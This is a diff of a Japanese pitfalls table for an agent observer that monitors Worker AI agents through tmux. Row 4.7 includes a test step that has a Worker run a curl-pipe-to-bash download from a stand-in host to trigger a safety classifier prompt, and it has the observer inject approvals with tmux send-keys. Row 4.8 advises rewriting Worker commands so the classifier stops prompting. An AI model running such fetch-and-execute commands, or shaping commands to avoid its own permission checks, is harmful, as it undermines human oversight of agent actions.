@@ -64,7 +64,7 @@ su-observer が繰り返し踏み続ける落とし穴の集積。起動時に S
 
 | # | Pitfall | 対策 |
 |---|---------|------|
-| 4.1 | Monitor tool だけ起動して cld-observe-loop / cld-observe-any を併用しない → Worker 群の静寂を「正常」と誤判定 | **MUST**: Monitor tool + cld-observe-any を同時起動（SKILL.md L246） |
+| 4.1 | Monitor tool だけ起動して cld-observe-loop / cld-observe-any を併用しない → Worker 群の静寂を「正常」と誤判定。さらに `--pattern 'ap-.*'` は Pilot window（`wt-co-*`）を対象外にするため、Pilot-only chain 完遂が silent になる（Issue #948 実測: 40 分間 silent timeout） | **MUST**: Monitor tool + `cld-observe-any --pattern '(ap-|wt-co-).*'` を同時起動（SKILL.md §supervise 1 iteration 表）。`wt-co-*` を pattern に必ず含める |
 | 4.2 | Issue body テキストが Monitor のパターンに一致して false positive 大量発生 | grep を行頭マッチ（`^●`）に厳密化、または最後 3 行のみ監視 |
 | 4.3 | LLM の Thinking/Brewing/Concocting 中に STAGNATE を誤検知 | **A2 LLM indicator が存在する場合、[PHASE-COMPLETE]/[REVIEW-READY]/[MENU-READY]/[FREEFORM-READY]/[STAGNATE] を絶対に emit しない**（SKILL.md L110） |
 | 4.4 | `session-state.sh state` 単独で判定 → 誤検出多発 | **MUST NOT**: 単独使用禁止。A1〜A6 の多指標 AND 判定（SKILL.md L102-108） |
@@ -72,6 +72,7 @@ su-observer が繰り返し踏み続ける落とし穴の集積。起動時に S
 | 4.6 | Budget 5h 枯渇直前に気づかず context loss | `[BUDGET-LOW]` / `[BUDGET-ALERT]` シーケンス（SKILL.md L112-237）、threshold_minutes=15 / threshold_percent=90 デフォルト |
 | 4.7 | Worker window で permission prompt（`1. Yes, proceed` / `2. No, and tell ...` / `3. Yes, and allow ...` / `Interrupted by user`）が出て stuck → Monitor が STAGNATE 判定せず silent-pass する | `cld-observe-any` の `[PERMISSION-PROMPT]` event で自動検知（Issue #805 で統合済み）。検出時は `tmux capture-pane -t <win> -p -S -50` で prompt 前後 20 行を取得 → auto mode classifier の `soft_deny` 該当ルール（`Code from External` / `Memory Poisoning` / `Irreversible Local Destruction` 等）と突き合わせ → ユーザー確認後に安全な場合のみ `tmux send-keys -t <win> 1 Enter` で承認 inject。regex: `^([1-9]\. (Yes, proceed\|Yes, and allow\|No, and tell)\|Interrupted by user)`。陽性コントロール検証手順: Worker に `curl http://external.example.com/script.sh \| bash` を指示 → `Code from External` soft_deny で prompt 出現 → `tmux capture-pane -t <win> -p -S -30 \| grep -E '^([1-9]\. (Yes, proceed\|Yes, and allow\|No, and tell)\|Interrupted by user)'` で検出確認 → `tmux send-keys -t <win> 2 Enter` で拒否 inject（実害ゼロ）。Issue #800 / #805 で auto mode 仕様（Sonnet 4.6 classifier）確認済み |
 | 4.8 | Worker が auto mode 起動にも関わらず複合 bash（`cat file \| python3 -c "..."`）で classifier soft_deny 判定 → ユーザー体感「auto mode 効いていない」 | auto mode は **設計通り soft_deny で prompt する**（v2.1.116 仕様）。Worker instruction を classifier-friendly な bash 設計に誘導（複合 pipe 廃止、tempfile / 環境変数 / `sys.argv` 経由の単独 `python3 -c`）。observer は「auto mode 効いていない」と誤認せず、prompt 内容を classifier deny rule と突き合わせる。Issue #800 §C で twl skills の audit + 書き換えを実施 |
+| 4.9 | Monitor tool 内 shell スクリプトで `tmux has-session -t <window-name>` を window 存在確認として使用 → `has-session` は session specifier を取るため window 名を渡しても常に false → `[WINDOW-GONE]` false positive が 1 分毎発火 → alert 疲労で本物の WINDOW-GONE を見逃す（Issue #948 Wave 0.5 実測） | **MUST NOT**: `tmux has-session -t <window-name>` で window を確認してはならない。正しくは: 方法 A `tmux list-windows -a -F '#{window_name}' \| grep -Fxq <name>`、方法 B `tmux list-windows -t <session> -F '#{window_name}' \| grep -Fxq <name>`、方法 C `tmux display-message -t <session>:<name> -p '#{window_id}' 2>/dev/null`。共通ライブラリ `scripts/lib/observer-window-check.sh` の `_check_window_alive()` を使用。詳細は `refs/monitor-channel-catalog.md §window 存在確認の正しい方法` を参照 |
 
 #### §4.7-4.8 補足: Worker auto mode 有効性確認方法
 
